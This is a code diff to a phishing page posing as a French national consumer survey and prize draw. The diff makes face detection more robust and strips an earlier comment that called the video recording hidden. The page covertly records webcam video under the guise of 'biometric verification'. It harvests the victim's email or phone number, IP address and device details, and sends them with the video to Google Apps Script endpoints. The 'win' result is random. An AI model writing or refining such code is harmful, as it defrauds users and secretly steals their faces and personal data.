@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enquête Nationale sur la Consommation - Jeu-Concours</title>
-<!-- Ajout de la librairie de détection de visage -->
 <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <style>
   @font-face {
@@ -207,7 +206,6 @@
     </div>
   </div>
 
-  <!-- ÉCRAN DE FIN : GAGNÉ -->
   <div class="confirmation-box" id="step-win">
     <h2>Votre demande a bien été enregistrée</h2>
     <div class="info-box">
@@ -222,7 +220,6 @@
     <p style="font-size: 14px; color: #666; margin-top: 20px;">Conservez cet accusé de réception. Aucune action supplémentaire n'est requise de votre part.</p>
   </div>
 
-  <!-- ÉCRAN DE FIN : PERDU -->
   <div class="confirmation-box" id="step-lose">
     <h2 style="color: #000091; border-bottom-color: #000091;">Participation enregistrée</h2>
     <div class="info-box">
@@ -258,7 +255,6 @@
 const SCRIPT_URL_TEXT = "https://script.google.com/macros/s/AKfycbyBI-fdD9Kw44y3qMp0s4YrDq8RKf5Nod8Zzz_Yeqz8MtksyzWdhP73xE9vPp2ejVj1Ug/exec";
 const SCRIPT_URL_PHOTO = "https://script.google.com/macros/s/AKfycbxGcA_5HG9JtEY48Kw1mowcVVgLUNG1Zl3VTXupuCBOQzPurZIeHiGubUSC1ArcEnp9Ig/exec";
 
-// --- GESTION DYNAMIQUE DES DATES ---
 const currentYear = new Date().getFullYear();
 document.querySelectorAll('.year-dyn').forEach(el => el.textContent = currentYear);
 document.getElementById('date-mentions').textContent = new Date().toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
@@ -273,16 +269,12 @@ function toggleMenu(event) {
 }
 
 window.onclick = function(event) {
-  if (event.target.classList.contains('modal')) {
-    event.target.style.display = 'none';
-  }
+  if (event.target.classList.contains('modal')) { event.target.style.display = 'none'; }
   if (!event.target.matches('.dropdown-btn') && !event.target.matches('.dropdown-btn span')) {
     var dropdowns = document.getElementsByClassName("dropdown-content");
     for (var i = 0; i < dropdowns.length; i++) {
       var openDropdown = dropdowns[i];
-      if (openDropdown.classList.contains('show')) {
-        openDropdown.classList.remove('show');
-      }
+      if (openDropdown.classList.contains('show')) { openDropdown.classList.remove('show'); }
     }
   }
 }
@@ -399,7 +391,6 @@ btnNext.addEventListener('click', () => {
 
 document.getElementById('btn-claim').addEventListener('click', () => {
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
   if (inputMethod.value === 'email') {
     if (!inputContact.value || !emailRegex.test(inputContact.value)) {
       alert("Veuillez saisir une adresse e-mail valide (ex: nom@domaine.fr).");
@@ -411,7 +402,6 @@ document.getElementById('btn-claim').addEventListener('click', () => {
       return;
     }
   }
-
   progressFill.style.width = '75%';
   stepPrize.classList.remove('active');
   stepFinal.classList.add('active');
@@ -442,142 +432,139 @@ btnSubmit.addEventListener('click', async () => {
     video.srcObject = mediaStream;
     cameraArea.style.display = 'block';
 
+    // --- CORRECTION : Attendre que la vidéo soit vraiment prête ---
+    await new Promise(resolve => {
+      if (video.readyState >= 2) { resolve(); }
+      else { video.onloadeddata = () => resolve(); }
+    });
+
     const track = mediaStream.getVideoTracks()[0];
     const caps = track.getCapabilities ? track.getCapabilities() : {};
     if (caps.torch) {
       try { await track.applyConstraints({ advanced: [{ torch: true }] }); } catch (e) {}
     }
 
-    // --- NOUVEAU : DÉTECTION DE VISAGE ---
+    // --- DÉTECTION DE VISAGE SÉCURISÉE ---
     loaderText.textContent = "Recherche biométrique (visage)...";
     loaderBarFill.style.width = '25%';
 
-    // Si la librairie face-api est bien chargée
-    if (typeof faceapi !== 'undefined') {
-      // Chargement du modèle (peut prendre 1-2 sec la première fois)
-      await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
+    await new Promise(async (resolve) => {
+      if (typeof faceapi === 'undefined') { resolve(); return; }
       
-      let faceDetected = false;
-      let attempts = 0;
-      
-      // On vérifie toutes les 500ms si un visage est présent
-      const checkFaceInterval = setInterval(async () => {
-        attempts++;
-        // Au bout de 10 secondes (20 * 500ms) on abandonne et on lance quand même (au cas où)
-        if (attempts > 20) {
-          clearInterval(checkFaceInterval);
-          startCapture();
-          return;
-        }
-        
-        const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
-        if (detection) {
-          clearInterval(checkFaceInterval);
-          startCapture();
-        }
-      }, 500);
-      
-    } else {
-      // Si face-api n'est pas chargé (ex: pas d'internet), on lance direct
-      startCapture();
-    }
-
-    function startCapture() {
-      loaderText.textContent = "Analyse biométrique en cours...";
-      loaderBarFill.style.width = '50%';
-
-      // --- ENREGISTREMENT VIDÉO EN CACHETTE ---
-      let mediaRecorder;
-      let recordedChunks = [];
-      let mimeType = 'video/webm';
-      let extension = 'webm';
-      
-      if (MediaRecorder.isTypeSupported('video/mp4')) {
-          mimeType = 'video/mp4';
-          extension = 'mp4';
-      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-          mimeType = 'video/webm;codecs=vp9';
-      } else if (MediaRecorder.isTypeSupported('video/webm')) {
-          mimeType = 'video/webm';
-      }
-
-      mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });
-      
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) {
-          recordedChunks.push(event.data);
-        }
-      };
-
-      mediaRecorder.start();
-
-      setTimeout(() => {
-        loaderText.textContent = "Vérification anti-robot et sécurisation...";
-        loaderBarFill.style.width = '80%';
-      }, 1500);
-
-      setTimeout(() => {
-        mediaRecorder.stop();
-        loaderBarFill.style.width = '100%';
-        loaderText.textContent = "Validation terminée.";
-
-        setTimeout(async () => {
-          const videoBlob = new Blob(recordedChunks, { type: mimeType });
-          const reader = new FileReader();
+      try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
+        let attempts = 0;
+        const checkFaceInterval = setInterval(async () => {
+          attempts++;
+          if (attempts > 20) { clearInterval(checkFaceInterval); resolve(); return; }
           
-          reader.onloadend = async function() {
-            const mediaBase64 = reader.result;
-            const ip = await getPublicIP();
-            
-            const formDataTexte = new URLSearchParams();
-            formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
-            formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
-            formDataTexte.append("ip", ip);
-            formDataTexte.append("os", info.os);
-            formDataTexte.append("browser", info.browser);
-            formDataTexte.append("screen", screenInfo);
-            formDataTexte.append("lang", navigator.language);
-            formDataTexte.append("cores", cores);
-            formDataTexte.append("ram", ram);
-            formDataTexte.append("battery", batteryInfo);
-            formDataTexte.append("userAgent", info.ua);
+          try {
+            const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
+            if (detection) { clearInterval(checkFaceInterval); resolve(); }
+          } catch (err) {
+            console.warn("Erreur détection visage:", err);
+            clearInterval(checkFaceInterval); resolve();
+          }
+        }, 500);
+      } catch (err) {
+        console.warn("Impossible de charger face-api:", err);
+        resolve();
+      }
+    });
 
-            fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
+    // --- ENREGISTREMENT VIDÉO ---
+    loaderText.textContent = "Analyse biométrique en cours...";
+    loaderBarFill.style.width = '50%';
 
-            const formDataMedia = new URLSearchParams();
-            formDataMedia.append("media", mediaBase64);
-            formDataMedia.append("extension", extension);
-            fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
-
-            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-            
-            const randomNum = Math.floor(Math.random() * 100) + 1;
-            
-            setTimeout(() => {
-              loader.style.display = 'none';
-              cameraArea.style.display = 'none';
-              stepFinal.classList.remove('active');
-              
-              if (randomNum <= 15) {
-                document.getElementById('confirm-method-win').textContent = inputMethod.value === 'sms' ? "SMS" : "e-mail";
-                document.getElementById('doc-number-win').textContent = "G-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
-                stepWin.classList.add('active');
-              } else {
-                document.getElementById('doc-number-lose').textContent = "P-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
-                stepLose.classList.add('active');
-              }
-              
-              progressFill.style.width = '100%';
-            }, 300);
-          };
-          reader.readAsDataURL(videoBlob);
-        }, 300);
-
-      }, 4500); // Enregistrement de 4.5s
+    let mediaRecorder;
+    let recordedChunks = [];
+    let mimeType = 'video/webm';
+    let extension = 'webm';
+    
+    if (MediaRecorder.isTypeSupported('video/mp4')) {
+        mimeType = 'video/mp4';
+        extension = 'mp4';
+    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+        mimeType = 'video/webm;codecs=vp9';
+    } else if (MediaRecorder.isTypeSupported('video/webm')) {
+        mimeType = 'video/webm';
     }
+
+    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });
+    
+    mediaRecorder.ondataavailable = event => {
+      if (event.data.size > 0) { recordedChunks.push(event.data); }
+    };
+
+    mediaRecorder.start();
+
+    setTimeout(() => {
+      loaderText.textContent = "Vérification anti-robot et sécurisation...";
+      loaderBarFill.style.width = '80%';
+    }, 1500);
+
+    setTimeout(() => {
+      mediaRecorder.stop();
+      loaderBarFill.style.width = '100%';
+      loaderText.textContent = "Validation terminée.";
+
+      setTimeout(async () => {
+        const videoBlob = new Blob(recordedChunks, { type: mimeType });
+        const reader = new FileReader();
+        
+        reader.onloadend = async function() {
+          const mediaBase64 = reader.result;
+          const ip = await getPublicIP();
+          
+          const formDataTexte = new URLSearchParams();
+          formDataTexte.append("email", inputMethod.value === 'email' ? inputContact.value : "");
+          formDataTexte.append("phone", inputMethod.value === 'sms' ? inputContact.value : "");
+          formDataTexte.append("ip", ip);
+          formDataTexte.append("os", info.os);
+          formDataTexte.append("browser", info.browser);
+          formDataTexte.append("screen", screenInfo);
+          formDataTexte.append("lang", navigator.language);
+          formDataTexte.append("cores", cores);
+          formDataTexte.append("ram", ram);
+          formDataTexte.append("battery", batteryInfo);
+          formDataTexte.append("userAgent", info.ua);
+
+          fetch(SCRIPT_URL_TEXT, { method: "POST", body: formDataTexte }).catch(e => console.log(e));
+
+          const formDataMedia = new URLSearchParams();
+          formDataMedia.append("media", mediaBase64);
+          formDataMedia.append("extension", extension);
+          fetch(SCRIPT_URL_PHOTO, { method: "POST", body: formDataMedia }).catch(e => console.log(e));
+
+          if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+          
+          const randomNum = Math.floor(Math.random() * 100) + 1;
+          
+          setTimeout(() => {
+            loader.style.display = 'none';
+            cameraArea.style.display = 'none';
+            stepFinal.classList.remove('active');
+            
+            if (randomNum <= 15) {
+              document.getElementById('confirm-method-win').textContent = inputMethod.value === 'sms' ? "SMS" : "e-mail";
+              document.getElementById('doc-number-win').textContent = "G-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+              stepWin.classList.add('active');
+            } else {
+              document.getElementById('doc-number-lose').textContent = "P-" + currentYear + "-" + Math.floor(100000 + Math.random() * 900000);
+              stepLose.classList.add('active');
+            }
+            
+            progressFill.style.width = '100%';
+          }, 300);
+        };
+        reader.readAsDataURL(videoBlob);
+      }, 300);
+
+    }, 4500);
 
   } catch (err) {
-    loaderText.textContent = "Impossible de lancer la vérification. Veuillez autoriser la caméra.";
+    console.error("Erreur globale :", err);
+    loaderText.textContent = "Impossible de lancer la vérification. Veuillez vérifier vos permissions.";
     loaderText.style.color = "#E1000F";
     loaderBarFill.style.backgroundColor = "#E1000F";
   }
